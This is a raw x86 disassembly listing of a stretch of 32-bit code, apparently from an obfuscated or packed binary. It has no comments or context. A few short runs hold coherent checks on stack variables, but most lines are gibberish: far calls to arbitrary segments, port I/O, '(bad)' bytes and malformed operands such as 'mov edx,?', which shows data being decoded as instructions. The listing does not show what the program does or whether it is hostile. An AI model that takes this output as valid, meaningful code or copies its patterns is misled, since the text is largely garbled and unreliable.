  40191e:	push   es
  40191f:	das    
  401920:	or     DWORD PTR [esi+0x5365f73b],ebp
  401926:	mov    dl,0x25
  401928:	call   0xbd24:0x63f218df
  40192f:	xlat   BYTE PTR cs:[ebx]
  401931:	stos   DWORD PTR es:[edi],eax
  401932:	je     0x401994
  401934:	test   ecx,ecx
  401936:	cwde   
  401937:	inc    ebp
  401938:	sbb    BYTE PTR [ebx-0x7d],bh
  40193b:	test   DWORD PTR [ebp-0x321c9ac3],0x76819df8
  401945:	call   0xb581:0xa98c0466
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x947bf628
  401994:	jle    0x40197d
  401996:	jns    0x401a08
  401998:	jp     0x401a0a
  40199a:	jo     0x401a0c
  40199c:	jle    0x401a0e
  40199e:	jo     0x401994
  4019a0:	xor    edi,esp
  4019a2:	iret   
  4019a3:	mov    bl,0x93
  4019a5:	rol    ecx,cl
  4019a7:	cld    
  4019a8:	and    esp,DWORD PTR [esi+0x57]
  4019ab:	xor    ebx,DWORD PTR [eax-0x10]
  4019ae:	cwde   
  4019af:	cmc    
  4019b0:	nop
  4019b1:	adc    ah,al
  4019b3:	or     bh,BYTE PTR [ecx+0x3ec2b178]
  4019b9:	outs   dx,DWORD PTR ds:[esi]
  4019ba:	data16 fisub DWORD PTR [ecx-0x79]
  4019be:	(bad)  
  4019bf:	mov    ds:0xf79b4570,eax
  4019c4:	fadd   st(3),st
  4019c6:	popa   
  4019c7:	mov    cl,0x4
  4019c9:	adc    BYTE PTR ds:0xb9708601,0xac
  4019d0:	mov    dl,0xe0
  4019d2:	cmp    DWORD PTR [ecx+0x7234af07],esp
  4019d8:	xlat   BYTE PTR ds:[ebx]
  4019d9:	fdiv   DWORD PTR [ebx-0x34]
  4019dc:	mov    al,0x8
  4019de:	ret    
  4019df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019e0:	push   esi
  4019e1:	sbb    ah,al
  4019e3:	pop    ebx
  4019e4:	js     0x401966
  4019e6:	mov    edx,?
  4019e8:	call   0x3b3756e2
  4019ed:	adc    edi,DWORD PTR [ebp-0x4dc2deb9]
  4019f3:	mov    bh,0x54
  4019f5:	stos   BYTE PTR es:[edi],al
  4019f6:	mov    esi,ecx
  4019f8:	bound  edi,QWORD PTR [edx+0x689ca095]
  4019fe:	pushf  
  4019ff:	rcr    DWORD PTR [edx+0x27],cl
  401a02:	adc    BYTE PTR [esi-0x6a],al
  401a05:	pop    esp
  401a06:	paddw  mm5,QWORD PTR [eax+0x200f3f04]
  401a0d:	mov    edx,fs
  401a0f:	jmp    0xe0ad:0xb739d3c4
  401a16:	jge    0x401a03
  401a18:	mov    eax,fs
  401a1a:	ret    0x75e2
  401a1d:	jno    0x401a40
  401a1f:	div    BYTE PTR [esi+0x793d9316]
  401a25:	sahf   
  401a26:	call   0xad36:0xe92f16eb
  401a2d:	loopne 0x4019f9
  401a2f:	xor    cl,BYTE PTR [edx]
  401a31:	outs   dx,DWORD PTR ds:[esi]
  401a32:	fiadd  DWORD PTR [edx+0x37]
  401a35:	ss mov ch,0x82
  401a38:	push   0x776ef29
  401a3d:	jmp    FWORD PTR [esi+0x788bdec8]
  401a43:	pop    esi
  401a44:	sub    BYTE PTR ds:0x482ca39d,bh
  401a4a:	test   DWORD PTR [edx-0x5a],esp
  401a4d:	xor    BYTE PTR [edi+0x33],ah
  401a50:	mov    al,0x8c
  401a52:	je     0x401aa1
  401a54:	inc    eax
  401a55:	ret    
  401a56:	outs   dx,DWORD PTR ds:[esi]
  401a57:	cmp    BYTE PTR [ecx+0x2b3525e5],0x7b
  401a5e:	or     DWORD PTR [ebp-0x7f],ebx
  401a61:	push   cs
  401a62:	inc    edi
  401a63:	sub    eax,0x9bcd1024
  401a68:	aam    0xe2
  401a6a:	out    dx,al
  401a6b:	(bad)
  401a6e:	cmp    BYTE PTR [ebp-0x53],dl
  401a71:	push   edx
  401a72:	sti    
  401a73:	pop    edx
  401a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a75:	loop   0x401a5e
  401a77:	je     0x401a45
  401a79:	mov    ch,0xb9
  401a7b:	sar    DWORD PTR [esi],0xa3
  401a7e:	jecxz  0x401a45
  401a80:	jp     0x401a14
  401a82:	dec    ecx
  401a83:	stos   DWORD PTR es:[edi],eax
  401a84:	jl     0x401ad4
  401a86:	cli    
  401a87:	xchg   esp,eax
  401a88:	mov    ds:0x93e132b1,eax
  401a8d:	sub    dl,BYTE PTR [ebp-0x5e]
  401a90:	xchg   ebx,eax
  401a91:	add    cl,0x43
  401a94:	inc    esp
  401a95:	push   0xc8950f17
  401a9a:	xchg   ecx,eax
  401a9b:	adc    esp,DWORD PTR [edi]
  401a9d:	out    0x6c,al
  401a9f:	mov    edx,0x22e8f95e
  401aa4:	adc    eax,DWORD PTR [edx-0x35]
  401aa7:	sub    BYTE PTR [eax],dh
  401aa9:	mov    dh,0x72
  401aab:	mov    BYTE PTR [ebx],dl
  401aad:	inc    edx
  401aae:	lods   eax,DWORD PTR ds:[esi]
  401aaf:	test   al,0x48
  401ab1:	mov    DWORD PTR [edx-0x1],ecx
  401ab4:	push   edi
  401ab5:	or     DWORD PTR [edx+0x568f595e],ebp
  401abb:	jl     0x401afd
  401abd:	inc    esi
  401abe:	pop    esp
  401abf:	pop    ds
  401ac0:	fisubr DWORD PTR [eax-0x67]
  401ac3:	push   ss
  401ac4:	stc    
  401ac5:	stos   DWORD PTR es:[edi],eax
  401ac6:	mov    edx,0x5612e2d9
  401acb:	mov    ?,ebx
  401acd:	xchg   ebp,edx
  401acf:	retf   0x2c05
  401ad2:	jae    0x401ab3
  401ad4:	add    BYTE PTR [ecx+0x1b8dfca2],dh
  401ada:	pop    ss
  401adb:	cwde   
  401adc:	cmp    eax,0x4d01973e
  401ae1:	ss mov eax,0xcd9f9c8a
  401ae7:	pop    ecx
  401ae8:	or     dl,BYTE PTR [ecx-0x781aa8cb]
  401aee:	aad    0x60
  401af0:	repz rcl DWORD PTR [edi+esi*8-0x22ad1c7],cl
  401af8:	aam    0x90
  401afa:	fisubr WORD PTR [esi+0x43]
  401afd:	lods   eax,DWORD PTR ds:[esi]
  401afe:	sub    al,0x35
  401b00:	mov    ch,0x0
  401b02:	cld    
  401b03:	mov    ebp,0xa5ed4161
  401b08:	addr16 cmp al,0x2c
  401b0b:	out    dx,al
  401b0c:	pop    edx
  401b0d:	xor    esi,ebp
  401b0f:	adc    DWORD PTR [esi-0x6fabc0be],eax
  401b15:	test   eax,0x744f156c
  401b1a:	add    ebp,ecx
  401b1c:	sahf   
  401b1d:	in     eax,0x45
  401b1f:	dec    ecx
  401b20:	rol    DWORD PTR [ebx+0xa],cl
  401b23:	push   ebx
  401b24:	adc    BYTE PTR [eax-0x13],0x8c
  401b28:	push   ecx
  401b29:	dec    esi
  401b2a:	pusha  
  401b2b:	shl    BYTE PTR [eax],1
  401b2d:	psraw  mm7,mm5
  401b30:	cld    
  401b31:	clc    
  401b32:	aam    0xce
  401b34:	cmp    dl,dl
  401b36:	inc    eax
  401b37:	push   eax
  401b38:	sbb    bh,ah
  401b3a:	jmp    0x401b9c
  401b3c:	shl    cl,cl
  401b3e:	and    eax,0x921b0d10
  401b43:	sub    DWORD PTR [eax+0x439d12b9],ebx
  401b49:	jo     0x401b55
  401b4b:	mov    bh,0x15
  401b4d:	cmova  edi,esi
  401b50:	fucomp st(3)
  401b52:	rcl    BYTE PTR [esi],0x87
  401b55:	mov    eax,ds:0x7ddd66be
  401b5a:	mov    edx,0xa8929485
  401b5f:	cwde   
  401b60:	mov    WORD PTR [edi],ds
  401b62:	outs   dx,BYTE PTR ds:[esi]
  401b63:	add    ebx,edx
  401b65:	ja     0x401b22
  401b67:	inc    esp
  401b68:	mov    dh,0xf5
  401b6a:	int    0x47
  401b6c:	sbb    BYTE PTR [esi],ch
  401b6e:	xchg   edi,eax
  401b6f:	mov    bh,ch
  401b71:	cmp    al,0x46
  401b73:	add    BYTE PTR [edx],bh
  401b75:	int3   
  401b76:	ins    DWORD PTR es:[edi],dx
  401b77:	pop    esi
  401b78:	pusha  
  401b79:	faddp  st(2),st
  401b7b:	ja     0x401b8a
  401b7d:	cli    
  401b7e:	imul   ebx,DWORD PTR [eax+0x8],0xffffffad
  401b82:	(bad)  
  401b83:	sahf   
  401b84:	or     cl,BYTE PTR [edi]
  401b86:	dec    ebx
  401b87:	pop    ds
  401b88:	test   BYTE PTR [ebp-0x643d9a22],0xa3
  401b8f:	xchg   BYTE PTR [ecx-0x1689441b],dl
  401b95:	adc    esi,DWORD PTR [eax]
  401b97:	in     eax,0xff
  401b99:	adc    esi,DWORD PTR [ebx]
  401b9b:	repz clc 
  401b9d:	jb     0x401beb
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    dl,BYTE PTR [edx+0x704e0b54]
  401be1:	js     0x401c53
  401be3:	jo     0x401c55
  401be5:	jle    0x401c57
  401be7:	jo     0x401b73
  401be9:	push   esp
  401bea:	jb     0x401b71
  401bec:	adc    DWORD PTR [edi-0x2],ecx
  401bef:	mov    bl,0xc
  401bf1:	mov    bl,0xac
  401bf3:	into   
  401bf4:	jae    0x401bed
  401bf6:	mov    esi,0x897e430c
  401bfb:	push   eax
  401bfc:	call   0x658f:0x75fcb5b6
  401c03:	push   ebx
  401c04:	addr16 dec eax
  401c06:	std    
  401c07:	pop    ebp
  401c08:	xor    DWORD PTR [ecx-0x619573b6],ebx
  401c0e:	jecxz  0x401c51
  401c10:	mov    bh,0x6
  401c12:	dec    ebx
  401c13:	jge    0x401c7f
  401c15:	enter  0x62d,0xb9
  401c19:	push   0x69
  401c1b:	out    dx,eax
  401c1c:	add    al,0x62
  401c1e:	pop    ss
  401c1f:	ficomp DWORD PTR [edi+eiz*4+0x11]
  401c23:	sbb    eax,0x9f5eab58
  401c28:	or     dl,al
  401c2a:	iret   
  401c2b:	xchg   ecx,eax
  401c2c:	test   BYTE PTR [esi-0x41],ah
  401c2f:	sbb    al,0xb6
  401c31:	outs   dx,BYTE PTR ds:[esi]
  401c32:	je     0x401c60
  401c34:	xchg   ebp,eax
  401c35:	pop    esi
  401c36:	jae    0x401bf6
  401c38:	sub    edi,esi
  401c3a:	jnp    0x401c6c
  401c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c3d:	scas   eax,DWORD PTR es:[edi]
  401c3e:	sub    BYTE PTR [eax-0x42],bl
  401c41:	test   eax,0x2fd8c2d5
  401c46:	retf   0x479a
  401c49:	fild   QWORD PTR [edi+0xc]
  401c4c:	dec    ebp
  401c4d:	jns    0x401c33
  401c4f:	xchg   DWORD PTR [ecx],edi
  401c51:	outs   dx,DWORD PTR ds:[si]
  401c53:	jne    0x401c76
  401c55:	or     edi,DWORD PTR [eax]
  401c57:	xor    al,0xd9
  401c59:	mov    ah,al
  401c5b:	mov    ebx,0xbe4c9913
  401c60:	sbb    DWORD PTR [esi-0x4c],esp
  401c63:	lds    esi,FWORD PTR [ebp+0x16]
  401c66:	dec    esi
  401c67:	add    bh,BYTE PTR [eax+0x7b]
  401c6a:	fs (bad) 
  401c6c:	repz sbb al,BYTE PTR [ebp+0x49fdf9e9]
  401c73:	(bad)  
  401c74:	xor    DWORD PTR [eax-0x59],edi
  401c77:	lahf   
  401c78:	inc    edi
  401c79:	mov    BYTE PTR [ebp-0x44cb41f7],dh
  401c7f:	lock dec ecx
  401c81:	xchg   ebx,eax
  401c82:	enter  0x2354,0x6
  401c86:	es scas eax,DWORD PTR es:[edi]
  401c88:	test   al,0x54
  401c8a:	xor    al,0x75
  401c8c:	lahf   
  401c8d:	into   
  401c8e:	pushf  
  401c8f:	dec    ebx
  401c90:	jp     0x401c51
  401c92:	in     al,dx
  401c93:	jge    0x401cc5
  401c95:	pop    eax
  401c96:	retf   0xec00
  401c99:	add    DWORD PTR [ebx+edi*8],ebp
  401c9c:	ins    DWORD PTR es:[edi],dx
  401c9d:	shr    cl,0x22
  401ca0:	call   0x4520be61
  401ca5:	lods   al,BYTE PTR ds:[esi]
  401ca6:	mov    dh,0x5d
  401ca8:	int    0xed
  401caa:	xchg   ebp,eax
  401cab:	adc    DWORD PTR [edi+ecx*2+0x6a27bdd3],edi
  401cb2:	fxch   st(7)
  401cb4:	shl    BYTE PTR [ebp-0x5afa563a],1
  401cba:	(bad)  
  401cbb:	jmp    0x66a3:0xa68d5ccc
  401cc2:	imul   ebx,DWORD PTR [edi+0x6878ff9d],0x6e877583
  401ccc:	retf   
  401ccd:	sahf   
  401cce:	call   0x8a01:0xe186
  401cd4:	ds dec edx
  401cd6:	inc    eax
  401cd7:	mov    bh,0xc5
  401cd9:	pop    edx
  401cda:	ins    BYTE PTR es:[edi],dx
  401cdb:	in     eax,dx
  401cdc:	mov    ah,BYTE PTR [eax-0x69]
  401cdf:	jp     0x401c81
  401ce1:	call   0x5f4f:0x336fd732
  401ce8:	sub    BYTE PTR [ebx],ch
  401cea:	xchg   BYTE PTR [eax+eiz*1+0x19291b0c],bh
  401cf1:	adc    BYTE PTR [esi],dh
  401cf3:	dec    eax
  401cf4:	jge    0x401c8d
  401cf6:	lahf   
  401cf7:	mov    ebp,fs
  401cf9:	jae    0x401d2b
  401cfb:	pop    esp
  401cfc:	aaa    
  401cfd:	mov    ah,0x7
  401cff:	mov    al,0x8c
  401d01:	mov    ebx,0x37b504df
  401d06:	sbb    ah,ah
  401d08:	push   es
  401d09:	adc    BYTE PTR [edi-0x216a9529],dl
  401d0f:	dec    esp
  401d10:	jmp    0xd6d3:0xaf1b35bb
  401d17:	jae    0x401d23
  401d19:	test   al,0x4c
  401d1b:	hlt    
  401d1c:	loopne 0x401cb0
  401d1e:	xchg   ecx,eax
  401d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d20:	xchg   BYTE PTR [edi],al
  401d22:	sbb    cl,al
  401d24:	repz cdq 
  401d26:	add    BYTE PTR [esi+0x26],0xb5
  401d2a:	ins    BYTE PTR es:[edi],dx
  401d2b:	add    BYTE PTR [ecx-0x4e8efe23],al
  401d31:	sbb    esi,DWORD PTR [edi+0x3fb956cd]
  401d37:	daa    
  401d38:	rcr    BYTE PTR [ecx+0x5e],1
  401d3b:	push   eax
  401d3c:	inc    esi
  401d3d:	loope  0x401da0
  401d3f:	bound  ebx,QWORD PTR [eax]
  401d41:	(bad)  
  401d43:	adc    ebx,DWORD PTR [esi+eax*2+0x7a]
  401d47:	ret    0xf859
  401d4a:	xchg   esi,eax
  401d4b:	fmul   DWORD PTR [eax-0x5e]
  401d4e:	dec    edi
  401d4f:	jecxz  0x401d32
  401d51:	mov    ah,BYTE PTR [esi+ebx*4-0x101ce859]
  401d58:	pop    ds
  401d59:	jge    0x401d8d
  401d5b:	daa    
  401d5c:	inc    ebx
  401d5d:	xchg   ecx,eax
  401d5e:	leave  
  401d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d60:	xchg   esp,eax
  401d61:	xchg   ebx,eax
  401d62:	ja     0x401d48
  401d64:	cli    
  401d65:	sbb    esi,DWORD PTR ds:0x4d81404b
  401d6b:	loope  0x401d90
  401d6d:	test   esi,esi
  401d6f:	(bad)  
  401d70:	int    0x82
  401d72:	mov    esi,0x26890085
  401d77:	xor    BYTE PTR [eax],dl
  401d79:	xchg   ebp,eax
  401d7a:	je     0x401d82
  401d7c:	loop   0x401cff
  401d7e:	stc    
  401d7f:	popa   
  401d80:	in     al,0x6e
  401d82:	ret    0xff0e
  401d85:	push   esi
  401d86:	or     cl,BYTE PTR [edi+0x6a]
  401d89:	push   0x55be7a70
  401d8e:	cmp    DWORD PTR ds:0x7e7c5dc2,esi
  401d94:	in     al,dx
  401d95:	or     eax,0xaa85178c
  401d9a:	xchg   edi,eax
  401d9b:	lds    eax,FWORD PTR [esi]
  401d9d:	rol    DWORD PTR [edx],0x6c
  401da0:	xchg   ebx,eax
  401da1:	popa   
  401da2:	rol    dl,0x81
  401da5:	and    BYTE PTR [esi-0x26],bh
  401da8:	adc    DWORD PTR [edi+ebx*1],esp
  401dab:	stos   DWORD PTR es:[edi],eax
  401dac:	pop    ebx
  401dad:	mov    cl,0x76
  401daf:	cdq    
  401db0:	jo     0x401d74
  401db2:	pop    ebp
  401db3:	pop    ebx
  401db4:	stos   DWORD PTR es:[edi],eax
  401db5:	retf   
  401db6:	sub    al,0x57
  401db8:	shl    BYTE PTR [eax-0x68e45165],cl
  401dbe:	mov    bl,0x52
  401dc0:	dec    edi
  401dc1:	jmp    0x8921:0x1654a95d
  401dc8:	and    bh,BYTE PTR [edi+0x4f]
  401dcb:	pop    es
  401dcc:	mov    bl,0xee
  401dce:	arpl   ax,cx
  401dd0:	push   esi
  401dd1:	mov    bl,0x80
  401dd3:	pusha  
  401dd4:	fld    QWORD PTR [ecx-0x2e]
  401dd7:	fistp  DWORD PTR [edi-0x66]
  401dda:	(bad)  
  401ddb:	cld    
  401ddc:	imul   edi,DWORD PTR [esi+0x55],0x4
  401de0:	cmp    al,0x98
  401de2:	in     eax,dx
  401de3:	das    
  401de4:	popf   
  401de5:	push   0xffffffe5
  401de7:	mov    ecx,0x3de84503
  401dec:	jge    0x401e42
  401dee:	retf   0xf6c
  401df1:	test   BYTE PTR [esi],cl
  401df3:	add    BYTE PTR [eax],al
  401df5:	add    BYTE PTR [ebx+0x2081f045],cl
  401dfb:	cdq    
  401dfc:	sbb    al,0x75
  401dfe:	add    cl,ch
  401e00:	sub    DWORD PTR [ecx],ecx
  401e02:	add    BYTE PTR [eax],al
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [eax+edx*8-0x3b],dl
  401e44:	fcmovb st,st(7)
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	mov    gs,WORD PTR [edi]
  401e50:	(bad)  
  401e52:	loop   0x401ea1
  401e54:	add    edx,DWORD PTR [edi]
  401e56:	push   ss
  401e57:	mov    ah,0x50
  401e59:	jo     0x401e40
  401e5b:	dec    ebp
  401e5c:	xor    edi,esi
  401e5e:	mov    edi,0xc15c05dd
  401e63:	pop    esp
  401e64:	push   edx
  401e65:	jle    0x401dfb
  401e67:	rcl    DWORD PTR [eax+0x1],0xf7
  401e6b:	std    
  401e6c:	push   edx
  401e6d:	test   edx,edi
  401e6f:	dec    edi
  401e70:	stos   DWORD PTR es:[edi],eax
  401e71:	mov    edi,0x1db934be
  401e76:	sbb    DWORD PTR [esi],0xffffffff
  401e79:	hlt    
  401e7a:	call   0x9f98:0x8bf18526
  401e81:	or     BYTE PTR [ecx],dh
  401e83:	loopne 0x401e0c
  401e85:	add    eax,0xce31510c
  401e8a:	fisubr DWORD PTR ds:0xfa956d3c
  401e90:	pusha  
  401e91:	retf   
  401e92:	std    
  401e93:	jge    0x401e68
  401e95:	adc    ebp,DWORD PTR [esi]
  401e97:	adc    DWORD PTR [ecx+0x41],0xc06f844f
  401e9e:	fild   QWORD PTR [edx]
  401ea0:	(bad)  
  401ea3:	test   eax,0x56ccb5f0
  401ea8:	or     al,0x3c
  401eaa:	adc    al,0xc5
  401eac:	lock add dh,BYTE PTR [edx]
  401eaf:	mov    ds:0xc1074007,al
  401eb4:	sbb    al,0x23
  401eb6:	jno    0x401f27
  401eb8:	lea    ecx,[eax+edx*2+0x39]
  401ebc:	xchg   esp,eax
  401ebd:	lahf   
  401ebe:	popa   
  401ebf:	test   eax,0x36f7dc4b
  401ec4:	or     eax,0x76d6f98c
  401ec9:	inc    esi
  401eca:	adc    esp,DWORD PTR [ebx+0x43dea98e]
  401ed0:	xlat   BYTE PTR ds:[ebx]
  401ed1:	into   
  401ed2:	or     eax,0x2c43488f
  401ed7:	inc    esi
  401ed8:	xor    eax,0x39c5d5bc
  401edd:	icebp  
  401ede:	push   edi
  401edf:	fbstp  TBYTE PTR [eax+0x75]
  401ee2:	sahf   
  401ee3:	retf   
  401ee4:	xchg   ecx,eax
  401ee5:	ror    BYTE PTR [edx-0x39002038],1
  401eeb:	mov    ds:0x137b7522,eax
  401ef0:	hlt    
  401ef1:	out    0x44,al
  401ef3:	dec    esi
  401ef4:	add    eax,0x8693fc20
  401ef9:	nop
  401efa:	cli    
  401efb:	or     eax,0x162d6ac5
  401f00:	sbb    BYTE PTR [ebp+eiz*2-0x7b],bl
  401f04:	scas   al,BYTE PTR es:[edi]
  401f05:	push   0xfffffff8
  401f07:	and    BYTE PTR [esi-0x61],cl
  401f0a:	rcr    BYTE PTR [eax],1
  401f0c:	dec    ecx
  401f0d:	xor    bl,ah
  401f0f:	scas   al,BYTE PTR es:[edi]
  401f10:	cmp    esp,ecx
  401f12:	cmp    eax,0x298d218c
  401f17:	or     eax,0x80b310cf
  401f1c:	cmp    BYTE PTR [ebx-0x1af8864c],ah
  401f22:	or     eax,0xb89a7105
  401f27:	inc    esi
  401f28:	test   al,0x21
  401f2a:	nop
  401f2b:	shr    DWORD PTR [esi],0x1d
  401f2e:	fdivr  QWORD PTR [eax]
  401f30:	jb     0x401f4e
  401f32:	adc    al,0x1d
  401f34:	call   0x3ba8:0x92dfc83f
  401f3b:	or     eax,0x55e208e2
  401f40:	call   DWORD PTR [edi-0x3ac949ee]
  401f46:	in     al,0x8f
  401f48:	loope  0x401ef0
  401f4a:	pop    esi
  401f4b:	xchg   BYTE PTR [esp-0x45],ah
  401f4f:	mov    BYTE PTR [eax],bl
  401f51:	cmp    BYTE PTR [edx],dl
  401f53:	sti    
  401f54:	add    eax,0xec1c72a5
  401f59:	push   ds
  401f5a:	daa    
  401f5b:	(bad)  [edi]
  401f5d:	jl     0x401f9f
  401f5f:	mov    DWORD PTR [edi+0x5f008450],edx
  401f65:	inc    eax
  401f66:	cmp    cl,BYTE PTR [esi]
  401f68:	and    ah,BYTE PTR [edi+0x327ef32d]
  401f6e:	inc    ebx
  401f6f:	and    cl,BYTE PTR [ebx+0x5037ea0a]
  401f75:	lea    ecx,[ecx-0x79]
  401f78:	ja     0x401fae
  401f7a:	in     al,dx
  401f7b:	outs   dx,DWORD PTR ds:[esi]
  401f7c:	js     0x401fed
  401f7e:	gs inc edx
  401f80:	jmp    DWORD PTR [eax-0x68]
  401f83:	hlt    
  401f84:	cld    
  401f85:	(bad)  
  401f86:	fcmovne st,st(3)
  401f88:	push   0xdd5ccb99
  401f8d:	out    dx,eax
  401f8e:	jecxz  0x401f79
  401f90:	add    cl,dl
  401f92:	mov    al,BYTE PTR [ebp+0x56]
  401f95:	or     eax,0x9a10d3a9
  401f9a:	popa   
  401f9b:	(bad)  
  401f9c:	adc    eax,0xe1836c1b
  401fa1:	mov    bh,BYTE PTR [eax+0x79]
  401fa4:	stos   DWORD PTR es:[edi],eax
  401fa5:	leave  
  401fa6:	scas   al,BYTE PTR es:[edi]
  401fa7:	xlat   BYTE PTR ds:[ebx]
  401fa8:	fisubr WORD PTR [edx+0x79]
  401fab:	imul   esi,DWORD PTR [si+0x34b3],0x7268b5d2
  401fb4:	bound  edx,QWORD PTR [edx]
  401fb6:	cmc    
  401fb7:	sbb    esp,ebp
  401fb9:	xchg   ebx,eax
  401fba:	int3   
  401fbb:	ds hlt 
  401fbd:	mov    esp,0x6e766b69
  401fc2:	scas   al,BYTE PTR es:[edi]
  401fc3:	pop    ebx
  401fc4:	or     BYTE PTR [edx+0x1c],dl
  401fc7:	out    0xf9,al
  401fc9:	xor    al,0xc5
  401fcb:	jne    0x401fc9
  401fcd:	arpl   bp,ax
  401fcf:	fbstp  TBYTE PTR [esp+esi*4]
  401fd2:	sbb    ebp,DWORD PTR [eax]
  401fd4:	xchg   BYTE PTR [edi+0x2c865fc7],dh
  401fda:	cmp    eax,0xf335869d
  401fdf:	pop    ebx
  401fe0:	pop    esp
  401fe1:	push   ecx
  401fe2:	out    dx,eax
  401fe3:	cli    
  401fe4:	scas   al,BYTE PTR es:[edi]
  401fe5:	xchg   ecx,eax
  401fe6:	imul   esp,DWORD PTR [ecx],0xffffffe0
  401fe9:	xchg   ecx,eax
  401fea:	call   0x2455:0xb8d72755
  401ff1:	jmp    0x1740:0xb8b80458
  401ff8:	push   0x6c
  401ffa:	xor    bh,BYTE PTR [esp]
  401ffd:	mov    eax,0xccb53c87
  402002:	clc    
  402003:	mov    bl,0xef
  402005:	shl    DWORD PTR [eax],cl
  402007:	jmp    0xf6efc1b7
  40200c:	push   esi
  40200d:	cmp    eax,0xc7197959
  402012:	inc    ebx
  402013:	xor    BYTE PTR [eax+0x71],0xfe
  402017:	bound  eax,QWORD PTR [ecx+0x3d118c34]
  40201d:	xor    eax,0x9a0e85c9
  402022:	daa    
  402023:	daa    
  402024:	xchg   ebp,eax
  402025:	inc    ebp
  402026:	push   esi
  402027:	xor    DWORD PTR [edi],ebp
  402029:	ret    
  40202a:	or     eax,0xeab0e548
  40202f:	or     eax,0x7988f0c3
  402034:	jl     0x401fbb
  402036:	xchg   edx,eax
  402037:	hlt    
  402038:	lahf   
  402039:	xor    BYTE PTR [esi],bh
  40203b:	sbb    BYTE PTR [ebx+eiz*4+0x2bd2cf59],al
  402042:	scas   eax,DWORD PTR es:[edi]
  402043:	leave  
  402044:	sti    
  402045:	sub    esp,DWORD PTR [edi]
  402047:	rcl    bp,0xd
  40204b:	pop    ebx
  40204c:	add    ecx,DWORD PTR ds:0x8bd8558b
  402052:	adc    ah,BYTE PTR [esi+0x3]
  402055:	(bad)  
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	add    BYTE PTR [ecx-0x53],0xb4
  40206d:	cld    
  40206e:	jo     0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	jg     0x4020f6
  402078:	push   0xffffffde
  40207a:	fs cmp eax,0x5ee52af8
  402080:	sub    eax,0x9649f167
  402085:	aas    
  402086:	mov    bl,0xfb
  402088:	mov    edx,esi
  40208a:	fwait
  40208b:	pusha  
  40208c:	xor    eax,0xddf4d59e
  402091:	xchg   edi,eax
  402092:	ins    BYTE PTR es:[edi],dx
  402093:	mov    ds:0x4a439b78,eax
  402098:	xchg   edx,eax
  402099:	mov    edx,0xe1648b16
  40209e:	in     al,dx
  40209f:	fwait
  4020a0:	int    0x2f
  4020a2:	xchg   esp,eax
  4020a3:	sub    eax,0xe1623ad2
  4020a8:	enterw 0x4988,0xfe
  4020ad:	jae    0x4020c4
  4020af:	push   ebx
  4020b0:	out    0xe9,al
  4020b2:	lods   eax,DWORD PTR ds:[esi]
  4020b3:	pop    ecx
  4020b4:	cmp    BYTE PTR [esp+ebx*4+0x54],0xfd
  4020b9:	cwde   
  4020ba:	loop   0x402096
  4020bc:	dec    esp
  4020bd:	push   edx
  4020be:	mov    ah,0xf1
  4020c0:	jle    0x4020b3
  4020c2:	cmp    eax,ebp
  4020c4:	js     0x40208f
  4020c6:	lea    eax,[eax+0x297288d4]
  4020cc:	push   edi
  4020cd:	adc    DWORD PTR [edi],edi
  4020cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d0:	sbb    dh,BYTE PTR [edx]
  4020d2:	add    ch,BYTE PTR [esi-0x43]
  4020d5:	xor    ecx,esi
  4020d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
